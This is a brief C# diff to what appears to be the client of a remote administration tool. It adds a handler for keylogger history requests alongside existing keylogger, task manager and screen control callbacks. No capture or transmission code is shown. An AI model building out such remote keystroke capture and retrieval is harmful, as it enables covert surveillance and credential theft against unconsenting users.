@@ -61,6 +61,7 @@ namespace Client
                onKeyLoggerStart: kls => _ = _keyLoggerHandler!.HandleStartAsync(kls),
                onKeyLoggerStop: klt => _ = _keyLoggerHandler!.HandleStopAsync(klt),
                onKeyLoggerLangToggle: l => _ = _keyLoggerHandler!.HandleLangToggleAsync(l),
+               onKeyLoggerHistoryRequest: req => _ = _keyLoggerHandler!.HandleHistoryRequestAsync(req),
                onTaskManagerRequest: treq => _ = _taskManagerHandler!.HandleAsync(treq),
                onScreenControlStart: scs => _ = _screenControlHandler!.HandleStartAsync(scs),
                onScreenControlStop: scs => _ = _screenControlHandler!.HandleStopAsync(scs),
